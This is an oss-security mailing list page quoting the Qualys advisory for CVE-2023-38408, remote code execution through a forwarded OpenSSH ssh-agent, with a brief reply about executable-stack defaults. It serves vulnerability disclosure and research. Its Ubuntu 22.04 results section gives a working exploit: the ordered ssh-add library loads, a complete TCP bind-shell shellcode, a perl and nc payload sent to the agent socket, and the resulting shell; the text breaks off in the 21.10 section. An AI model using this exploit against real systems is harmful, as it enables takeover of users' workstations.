* [Cool Stuff Store](https://coolstuff.redhat.com/)
* [Red Hat Summit](https://www.redhat.com/en/summit)

 © 2025 Red Hat, Inc.
### Red Hat legal and privacy links

* [Privacy statement](https://redhat.com/en/about/privacy-policy)
* [Terms of use](https://redhat.com/en/about/terms-use)
* [All policies and guidelines](https://redhat.com/en/about/all-policies-guidelines)
* [Digital accessibility](https://redhat.com/en/about/digital-accessibility)



=== Content from www.openwall.com_4b350e1d_20250125_231147.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](../../../2023/07/19/9) [[next>]](2) [[<thread-prev]](../../../2023/07/19/9) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID:
 <MN0PR11MB611155CE342371EBED98F38AC039A@MN0PR11MB6111.namprd11.prod.outlook.com>
Date: Wed, 19 Jul 2023 22:13:56 +0000
From: Ramon de C Valle <rcvalle@...e.com>
To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
Subject: Re: CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded
 ssh-agent

> 1/ Some shared libraries require an executable stack, either explicitly
> because of an RWE (readable, writable, executable) GNU_STACK ELF header,
> or implicitly because of a missing GNU_STACK ELF header (in which case
> the loader defaults to an executable stack): when such an "execstack"
> library is dlopen()ed, the loader makes the main stack and all thread
> stacks executable, and they remain executable even after dlclose().
>
> For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
> installation of Ubuntu Desktop 22.04.

I reported and tried to fix this in 2012: [https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0@zmail15.collab.prod.int.phx2.redhat.com/](https://lore.kernel.org/lkml/f298f914-2239-44e4-8aa1-a51282e7fac0%40zmail15.collab.prod.int.phx2.redhat.com/), and more recently made a note about it at <https://rcvalle.com/2020/09/16/rust-exploit-mitigations/#appendix>. This is something I'd really like to see properly fixed. IMO, the READ_IMPLIES_EXEC personality needs to be completely separated from the PT_GNU_STACK program header by having a separate option for it (or setarch -X could just be used whenever READ_IMPLIES_EXEC is needed), and the absence of the PT_GNU_STACK program header needs to have more secure defaults (unrelated to READ_IMPLIES_EXEC).

________________________________
From: Qualys Security Advisory <qsa@...lys.com>
Sent: Wednesday, July 19, 2023 9:33 AM
To: oss-security@...ts.openwall.com <oss-security@...ts.openwall.com>
Subject: [oss-security] CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

Qualys Security Advisory

CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent

========================================================================
Contents
========================================================================

Summary
Background
Experiments
Results
Discussion
Acknowledgments
Timeline

========================================================================
Summary
========================================================================

    "ssh-agent is a program to hold private keys used for public key
    authentication. Through use of environment variables the agent can
    be located and automatically used for authentication when logging in
    to other machines using ssh(1). ... Connections to ssh-agent may be
    forwarded from further remote hosts using the -A option to ssh(1)
    (but see the caveats documented therein), avoiding the need for
    authentication data to be stored on other machines."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh-agent.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=yjcs4Ynt9Tc6YqjVRROv16ViQw3UbnTsOu4%2FpP6NkMk%3D&reserved=0><<https://man.openbsd.org/ssh-agent.1>>)

    "Agent forwarding should be enabled with caution. Users with the
    ability to bypass file permissions on the remote host ... can access
    the local agent through the forwarded connection. ... A safer
    alternative may be to use a jump host (see -J)."
    (<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fman.openbsd.org%2Fssh.1&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=U%2FkLvG5xpW91TcVhA%2FQQkXyDu6xkrFPFzxw%2BJH%2BhX%2FI%3D&reserved=0><<https://man.openbsd.org/ssh.1>>)

Despite this warning, ssh-agent forwarding is still widely used today.
Typically, a system administrator (Alice) runs ssh-agent on her local
workstation, connects to a remote server with ssh, and enables ssh-agent
forwarding with the -A or ForwardAgent option, thus making her ssh-agent
(which is running on her local workstation) reachable from the remote
server.

While browsing through ssh-agent's source code, we noticed that a remote
attacker, who has access to the remote server where Alice's ssh-agent is
forwarded to, can load (dlopen()) and immediately unload (dlclose()) any
shared library in /usr/lib* on Alice's workstation (via her forwarded
ssh-agent, if it is compiled with ENABLE_PKCS11, which is the default).

(Note to the curious readers: for security reasons, and as explained in
the "Background" section below, ssh-agent does not actually load such a
shared library in its own address space (where private keys are stored),
but in a separate, dedicated process, ssh-pkcs11-helper.)

Although this seems safe at first (because every shared library in
/usr/lib* comes from an official distribution package, and no operation
besides dlopen() and dlclose() is generally performed by ssh-agent on a
shared library), many shared libraries have unfortunate side effects
when dlopen()ed and dlclose()d, and are therefore unsafe to be loaded
and unloaded in a security-sensitive program such as ssh-agent. For
example, many shared libraries have constructor and destructor functions
that are automatically executed by dlopen() and dlclose(), respectively.

Surprisingly, by chaining four common side effects of shared libraries
from official distribution packages, we were able to transform this very
limited primitive (the dlopen() and dlclose() of shared libraries from
/usr/lib*) into a reliable, one-shot remote code execution in ssh-agent
(despite ASLR, PIE, and NX). Our best proofs of concept so far exploit
default installations of Ubuntu Desktop plus three extra packages from
Ubuntu's "universe" repository. We believe that even better results can
be achieved (i.e., some operating systems might be exploitable in their
default installation):

- we only investigated Ubuntu Desktop 22.04 and 21.10, we have not
  looked into any other versions, distributions, or operating systems;

- the "fuzzer" that we wrote to test our ideas is rudimentary and slow,
  and we ran it intermittently on a single laptop, so we have not tried
  all the combinations of shared libraries and side effects;

- we initially had only one attack vector in mind (i.e., one specific
  combination of side effects from shared libraries), but we discovered
  six more while analyzing the results of our fuzzer, and we are
  convinced that more attack vectors exist.

In this advisory, we present our research, experiments, reproducible
results, and further ideas to exploit this "dlopen() then dlclose()"
primitive. We will also publish the source code of our crude fuzzer at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fwww.qualys.com%2Fresearch%2Fsecurity-advisories%2F&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FMbEJy3RvkLHTGFD6%2F86IiR7qw78xm9XQqA6xOkOoqs%3D&reserved=0><<https://www.qualys.com/research/security-advisories/>> (warning: this code
might hurt the eyes of experienced fuzzing practitioners, but it gave us
quick answers to our many questions; it is provided "as is", in the hope
that it will be useful).

========================================================================
Background
========================================================================

The ability to load and unload shared libraries in ssh-agent was
developed in 2010 to support the addition and deletion of PKCS#11 keys:
ssh-agent forks and executes a long-running ssh-pkcs11-helper process
that dlopen()s PKCS#11 providers (shared libraries), and immediately
dlclose()s them if the symbol C_GetFunctionList cannot be found (i.e.,
if such a shared library is not actually a PKCS#11 provider, which is
the case for the vast majority of the shared libraries in /usr/lib*).

Note: ssh-agent also supports the addition of FIDO keys, by loading a
FIDO authenticator (a shared library) in a short-lived ssh-sk-helper
process; however, unlike ssh-pkcs11-helper, ssh-sk-helper is stateless
(it terminates shortly after loading a single shared library) and can
therefore not be abused by an attacker to chain the side effects of
several shared libraries.

Originally, the path of a shared library to be loaded in
ssh-pkcs11-helper was not filtered at all by ssh-agent, but in 2016 an
allow-list was added ("/usr/lib*/*,/usr/local/lib*/*" by default) in
response to CVE-2016-10009, which was published by Jann Horn (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fbugs.chromium.org%2Fp%2Fproject-zero%2Fissues%2Fdetail%3Fid%3D1009&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=j6hw2is5FhLWmZ3VfQPPXp%2Bg7VLQlBWEVxYnK%2BSuIyY%3D&reserved=0>):<<https://bugs.chromium.org/p/project-zero/issues/detail?id=1009>>

- if an attacker had access to the server where Alice's ssh-agent is
  forwarded to, and had an unprivileged access to Alice's workstation,
  then this attacker could store a malicious shared library in /tmp on
  Alice's workstation and execute it with Alice's privileges (via her
  forwarded ssh-agent) -- a mild form of Local Privilege Escalation;

- if the attacker had only access to the server where Alice's ssh-agent
  is forwarded to, but could somehow store a malicious shared library
  somewhere on Alice's workstation (without access to her workstation),
  then this attacker could remotely execute this shared library (via
  Alice's forwarded ssh-agent) -- a mild form of Remote Code Execution.

Our first reaction was of course to try to bypass ssh-agent's /usr/lib*
allow-list:

- by finding a logic bug in the filter function, match_pattern_list()
  (but we failed);

- by making a path-traversal attack, for example /usr/lib/../../tmp (but
  we failed, because ssh-agent first calls realpath() to canonicalize
  the path of a shared library, and then calls the filter function);

- by finding a locally or remotely writable file or directory in
  /usr/lib* (but we failed).

Our only option, then, is to abuse side effects of the existing shared
libraries in /usr/lib*; in particular, their constructor and destructor
functions, which are automatically executed by dlopen() and dlclose().
Eventually, we realized that this is essentially a remote version of
CVE-2010-3856, which was published in 2010 by Tavis Ormandy (at
<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fseclists.org%2Ffulldisclosure%2F2010%2FOct%2F344&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=%2FbjeLJwIbyFiW3Vo2r9Rj%2Fo6LACJqDegnjxx1zN5JOQ%3D&reserved=0>):<<https://seclists.org/fulldisclosure/2010/Oct/344>>

- an unprivileged local attacker could dlopen() any shared library from
  /lib and /usr/lib (via the LD_AUDIT environment variable), even when
  executing a SUID-root program;

- the constructor functions of various common shared libraries created
  files and directories whose location depended on the attacker's
  environment variables and whose creation mode depended on the
  attacker's umask;

- the local attacker could therefore create world-writable files and
  directories anywhere in the filesystem, and obtain full root
  privileges (via crond, for example).

Although the ability to load and unload shared libraries from /usr/lib*
in ssh-agent bears a striking resemblance to CVE-2010-3856, we are in a
much weaker position here, because we are trying to exploit ssh-agent
remotely, so we do not control its environment variables nor its umask
(and we do not even talk directly to ssh-pkcs11-helper, which actually
dlopen()s and dlclose()s the shared libraries: we talk to ssh-agent,
which canonicalizes and filters our requests before passing them on to
ssh-pkcs11-helper).

In fact, we do not control anything except the order in which we load
(and immediately unload) shared libraries from /usr/lib* in ssh-agent.
At that point, we almost abandoned our research, because we could not
possibly imagine how to transform this extremely limited primitive into
a one-shot remote code execution. Nevertheless, we felt curious and
decided to syscall-trace (strace) a dlopen() and dlclose() of every
shared library in the default installation of Ubuntu Desktop. We
instantly observed four surprising behaviors:

------------------------------------------------------------------------

1/ Some shared libraries require an executable stack, either explicitly
because of an RWE (readable, writable, executable) GNU_STACK ELF header,
or implicitly because of a missing GNU_STACK ELF header (in which case
the loader defaults to an executable stack): when such an "execstack"
library is dlopen()ed, the loader makes the main stack and all thread
stacks executable, and they remain executable even after dlclose().

For example, /usr/lib/systemd/boot/efi/linuxx64.elf.stub in the default
installation of Ubuntu Desktop 22.04.

------------------------------------------------------------------------

2/ Many shared libraries are marked as "nodelete" by the loader, either
explicitly because of a NODELETE ELF flag, or implicitly because they
are in the dependency list of a NODELETE library: the loader will never
unload (munmap()) such libraries, even after they are dlclose()d.

For example, /usr/lib/x86_64-linux-gnu/librt.so.1 in the default
installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

3/ Some shared libraries register a signal handler for SIGSEGV when they
are dlopen()ed, but they do not deregister this signal handler when they
are dlclose()d (i.e., this signal handler is still registered when its
code is munmap()ed).

For example, /usr/lib/x86_64-linux-gnu/libSegFault.so in the default
installation of Ubuntu Desktop 21.10.

------------------------------------------------------------------------

4/ Some shared libraries crash with a SIGSEGV as soon as they are
dlopen()ed (usually because of a NULL-pointer dereference), because they
are supposed to be loaded in a specific context, not in a random program
such as ssh-agent.

For example, most of the /usr/lib/x86_64-linux-gnu/xtables/lib*.so in
the default installation of Ubuntu Desktop 22.04 and 21.10.

------------------------------------------------------------------------

And so an exciting idea to remotely exploit ssh-agent came into our
mind:

a/ make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack) by dlopen()ing one of the "execstack"
libraries ("surprising behavior 1/"), and somehow store a 1990-style
shellcode somewhere in this executable stack;

b/ register a signal handler for SIGSEGV and immediately munmap() its
code, by dlopen()ing and dlclose()ing one of the shared libraries from
"surprising behavior 3/" (consequently, a dangling pointer to this
unmapped signal handler is retained in the kernel);

c/ replace the unmapped signal handler's code with another piece of code
from another shared library, by dlopen()ing (mmap()ing) one of the
"nodelete" libraries ("surprising behavior 2/");

d/ raise a SIGSEGV by dlopen()ing one of the shared libraries from
"surprising behavior 4/", so that the unmapped signal handler is called
by the kernel, but the replacement code from the "nodelete" library is
executed instead (a use-after-free of sorts);

e/ hope that this replacement code (which is mapped where the signal
handler was mapped) is a useful gadget that somehow jumps into the
executable stack, exactly where our shellcode is stored.

========================================================================
Experiments
========================================================================

But "hope is not a strategy", so we decided to implement the following
6-step plan to test our remote-exploitation idea in ssh-agent:

------------------------------------------------------------------------

Step 1 - We install a default Ubuntu Desktop, download all official
packages from Ubuntu's "main" and "universe" repositories, and extract
all /usr/lib* files from these packages. These files occupy ~200GB of
disk space and include ~60,000 shared libraries.

Note: after the default installation of Ubuntu Desktop, but before the
extraction of all /usr/lib* files, we "chattr +i /etc/ld.so.cache" to
make sure that this file does not grow unrealistically (from kilobytes
to megabytes); indeed, it is mmap()ed by the loader every time dlopen()
is called, and a large file might therefore destroy the mmap layout and
prevent our fuzzer's results from being reproducible in the real world.

------------------------------------------------------------------------

Step 2 - For each shared library in /usr/lib*, we fork and execute
ssh-pkcs11-helper, strace it, and request it to dlopen() (and hence
immediately dlclose()) this shared library; if we spot anything unusual
in the strace logs (a raised signal, a clone() call, etc) or outstanding
differences in /proc/pid/maps or /proc/pid/status between before and
after dlopen() and dlclose(), then we mark this shared library as
interesting.

------------------------------------------------------------------------

Step 3 - We analyze the results of Step 2. For example, on Ubuntu
Desktop 22.04:

- 58 shared libraries make the stack executable when dlopen()ed (and the
  stack remains executable even after dlclose());

- 16577 shared libraries permanently alter the mmap layout when
  dlopen()ed (either because they are "nodelete" libraries, or because
  they allocate a thread stack or otherwise leak mmap()ed memory);

- 9 shared libraries register a SIGSEGV handler when dlopen()ed (but do
  not deregister it when dlclose()d), and 238 shared libraries raise a
  SIGSEGV when dlopen()ed;

- 2 shared libraries register a SIGABRT handler when dlopen()ed, and 44
  shared libraries raise a SIGABRT when dlopen()ed.

On Ubuntu Desktop 21.10:

- 30 shared libraries make the stack executable;

- 16172 shared libraries permanently alter the mmap layout;

- 9 shared libraries register a SIGSEGV handler, and 147 shared
  libraries raise a SIGSEGV;

- 2 shared libraries register a SIGABRT handler, and 38 shared libraries
  raise a SIGABRT;

- 1 shared library registers a SIGBUS handler, and 11 shared libraries
  raise a SIGBUS;

- 1 shared library registers a SIGCHLD handler, and 61 shared libraries
  raise a SIGCHLD;

- 1 shared library registers a SIGILL handler, and 1 shared library
  raises a SIGILL.

------------------------------------------------------------------------

Step 4 - We implement a rudimentary fuzzing strategy, by forking and
executing ssh-pkcs11-helper in a loop, and by loading (and unloading)
random combinations of the interesting shared libraries from Step 3:

a/ we randomly load zero or more shared libraries that permanently alter
the mmap layout, in the hope of creating holes in the mmap layout, thus
potentially shifting the replacement code (which will later replace the
signal handler's code) with page precision;

b/ we randomly load one shared library that registers a signal handler
but does not deregister it when dlclose()d (i.e., when munmap()ed);

c/ we randomly load zero or more shared libraries that alter the mmap
layout (again), thus replacing the unmapped signal handler's code with
another piece of code (a hopefully useful gadget) from another shared
library (a "nodelete" library);

d/ we randomly load one shared library that raises the signal that is
caught by the unmapped signal handler: the replacement code (gadget) is
executed instead, and if it jumps into the stack (a SEGV_ACCERR with a
RIP register that points to the stack, because we did not make the stack
executable in this Step 4), then we mark this particular combination of
shared libraries as interesting.

Surprise: we actually get numerous jumps to the stack in this Step 4,
usually because the signal handler's code is replaced by a "jmp REG",
"call REG", or "pop; pop; ret" gadget, and the "REG" or popped RIP
register happens to point to the stack at the time of the jump.

------------------------------------------------------------------------

Step 5 - We implement this extra step to test whether the interesting
combinations of shared libraries from Step 4 actually jump into our
shellcode in the stack, or into uncontrolled data in the stack:

a/ we make the stack executable, by randomly loading one of the
"execstack" libraries from Step 3;

b/ we store ~10KB of 0xcc bytes in the stack buffer "buf" of
ssh-pkcs11-helper's main() function: 10KB is the maximum message length
that we can send to ssh-pkcs11-helper (via ssh-agent), and on amd64 0xcc
is the "int3" instruction that generates a SIGTRAP when executed;

c/ we randomly replay one of the interesting combinations of shared
libraries from Step 4: if a SIGTRAP is generated while the RIP register
points to the stack, then there is a fair chance that ssh-pkcs11-helper
jumped into our shellcode (our 0xcc bytes) in the executable stack.

Surprise: we actually get many SIGTRAPs in the stack during this Step 5,
but to our great dismay, most of these SIGTRAPs are generated because
ssh-pkcs11-helper jumps into the stack, in the middle of a pointer that
is stored on the stack and that happens to contain a 0xcc byte because
of ASLR (i.e., not because ssh-pkcs11-helper jumps into our own 0xcc
bytes in the stack).

------------------------------------------------------------------------

Step 6 - We implement this extra step to eliminate the false positives
produced by Step 5:

a/ we repeatedly replay (N times) each combination of shared libraries
that generates a SIGTRAP in the stack: if N SIGTRAPs are generated out
of N replays, then there is an excellent chance that ssh-pkcs11-helper
does indeed jump into our shellcode (our 0xcc bytes) in the stack (and
not into random bytes that happen to be 0xcc because of ASLR);

b/ if this is confirmed by a manual check (with gdb for example), then
we achieved a reliable, one-shot remote code execution in ssh-agent,
despite the very limited primitive, and despite ASLR, PIE, and NX.

========================================================================
Results
========================================================================

In this section, we present the results of our experiments:

- Signal handler use-after-free (Ubuntu Desktop 22.04)
- Signal handler use-after-free (Ubuntu Desktop 21.10)
- Callback function use-after-free
- Return from syscall use-after-free
- Sigaltstack use-after-free
- Sigreturn to arbitrary instruction pointer
- _Unwind_Context type-confusion
- RCE in library constructor

========================================================================
Signal handler use-after-free (Ubuntu Desktop 22.04)
========================================================================

This was our original idea for remotely attacking ssh-agent, as
discussed at the end of the "Background" section and as implemented in
the "Experiments" section. In this subsection, we present one of the
various combinations of shared libraries that result in a reliable,
one-shot remote code execution in ssh-agent on Ubuntu Desktop 22.04.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 22.04
(<https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fold-releases.ubuntu.com%2Freleases%2F22.04%2Fubuntu-22.04-desktop-amd64.iso&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Asi2VKNB1zU3PO0i%2B2M%2BotE7IgNbsWyWVKhL2XmAVeY%3D&reserved=0><<https://old-releases.ubuntu.com/releases/22.04/ubuntu-22.04-desktop-amd64.iso>>),
without connecting this workstation to the Internet.

------------------------------------------------------------------------

1b/ After the installation is complete, we modify /etc/apt/sources.list
to prevent any package from being upgraded to a version that is not the
one that we used in our experiments:

workstation# cp -i /etc/apt/sources.list /etc/apt/sources.list.backup
workstation# grep ' jammy ' /etc/apt/sources.list.backup > /etc/apt/sources.list

------------------------------------------------------------------------

1c/ We connect our workstation to the Internet, and install the three
packages (from Ubuntu's official "universe" repository) that contain the
three shared libraries used in this particular attack against ssh-agent:

workstation# apt-get update
workstation# apt-get upgrade
workstation# apt-get --no-install-recommends install eclipse-titan
workstation# apt-get --no-install-recommends install libkf5sonnetui5
workstation# apt-get --no-install-recommends install libns3-3v5

------------------------------------------------------------------------

2/ As Alice, we run ssh-agent on our local workstation, connect to a
remote server with ssh, and enable ssh-agent forwarding with -A:

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ eval `ssh-agent -s`
Agent pid 1105

workstation$ echo /tmp/ssh-*/agent.*
/tmp/ssh-XXXXXXmgHTo9/agent.1104

workstation$ ssh -A server

server$ id
uid=1001(alice) gid=1001(alice) groups=1001(alice)

server$ echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

------------------------------------------------------------------------

3/ Then, as a remote attacker who has access to this server:

------------------------------------------------------------------------

3a/ we remotely make ssh-agent's stack executable (more precisely,
ssh-pkcs11-helper's stack), via Alice's ssh-agent forwarding (indeed,
the ssh-agent itself is running on Alice's workstation, not on the
server):

server# echo /tmp/ssh-*/agent.*
/tmp/ssh-N5EjHljGRh/agent.1299

server# export SSH_AUTH_SOCK=/tmp/ssh-N5EjHljGRh/agent.1299

server# ssh-add -s /usr/lib/systemd/boot/efi/linuxx64.elf.stub
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/systemd/boot/efi/linuxx64.elf.stub": agent refused operation

------------------------------------------------------------------------

3b/ we remotely store a shellcode in the stack buffer "buf" of
ssh-pkcs11-helper's main() function:

server# SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n "$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

- we do not use ssh-add here, because we want to send a ~10KB passphrase
  (our shellcode) to ssh-agent, but ssh-add limits the length of our
  passphrase to 1KB;

- "\x90" x 10000 is a ~10KB "NOP sled" (on amd64, 0x90 is the "nop"
  instruction);

- SHELLCODE is a "TCP bind shell" on port 31337 (from
  <https://na01.safelinks.protection.outlook.com/?url=https%3A%2F%2Fshell-storm.org%2Fshellcode%2Ffiles%2Fshellcode-858.html&data=05%7C01%7C%7Ce12d96774c13433add7108db8875ffb9%7C84df9e7fe9f640afb435aaaaaaaaaaaa%7C1%7C0%7C638253812632612226%7CUnknown%7CTWFpbGZsb3d8eyJWIjoiMC4wLjAwMDAiLCJQIjoiV2luMzIiLCJBTiI6Ik1haWwiLCJXVCI6Mn0%3D%7C3000%7C%7C%7C&sdata=Kk1ZEIG3Eu6RBz4ODQ2Ojr%2Ba3H%2F5d1RpGm7TcCJzaUU%3D&reserved=0>)<<https://shell-storm.org/shellcode/files/shellcode-858.html>>;

- /usr/lib/modules is an existing directory whose path matches
  ssh-agent's /usr/lib* allow-list (indeed, we do not want to actually
  load a shared library here -- we just want to store our shellcode in
  the executable stack);

------------------------------------------------------------------------

3c/ we remotely register a SIGSEGV handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/titan/libttcn3-rt2-dynamic.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/titan/libttcn3-rt2-dynamic.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely replace the unmapped SIGSEGV handler's code with another
piece of code (a useful gadget) from another shared library:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libKF5SonnetUi.so.5.92.0": agent refused operation

------------------------------------------------------------------------

3e/ we remotely raise a SIGSEGV in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libns3.35-wave.so.0.0.0
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3f/ the replacement code (gadget) is executed (instead of the unmapped
SIGSEGV handler's code) and jumps to the stack, into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice) groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),134(lxd),135(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice       1105  0.0  0.1   7968  4192 ?        Ss   09:48   0:00 ssh-agent -s
alice       1249  0.0  0.0   2888   956 ?        S    10:03   0:00  \_ [sh]
alice       1268  0.0  0.0   7204  3092 ?        R    10:14   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGSEGV handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1307
...
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fb15c9b560e in std::_Rb_tree_decrement(std::_Rb_tree_node_base*) () from /lib/x86_64-linux-gnu/libstdc++.so.6

(gdb) stepi
0x00007fb15d0e1250 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) x/10i 0x00007fb15d0e1250
=> 0x7fb15d0e1250:      add    %rcx,%rdx
   0x7fb15d0e1253:      notrack jmp *%rdx
   ...

(gdb) stepi
0x00007fb15d0e1253 in ?? () from /lib/x86_64-linux-gnu/libQt5Widgets.so.5

(gdb) stepi
0x00007ffc2ec82691 in ?? ()

(gdb) x/10i 0x00007ffc2ec82691
=> 0x7ffc2ec82691:      nop
   0x7ffc2ec82692:      nop
   0x7ffc2ec82693:      nop
   0x7ffc2ec82694:      nop
   0x7ffc2ec82695:      nop
   0x7ffc2ec82696:      nop
   0x7ffc2ec82697:      nop
   0x7ffc2ec82698:      nop
   0x7ffc2ec82699:      nop
   0x7ffc2ec8269a:      nop

(gdb) !grep stack /proc/1307/maps
7ffc2ec66000-7ffc2ec87000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Signal handler use-after-free (Ubuntu Desktop 21.10)
========================================================================

In this subsection, we present one of the various combinations of shared
libraries that result in a reliable, one-shot remote code execution in
ssh-agent on Ubuntu Desktop 21.10.

------------------------------------------------------------------------

1a/ On our local workstation, we install a default Ubuntu Desktop 21.10
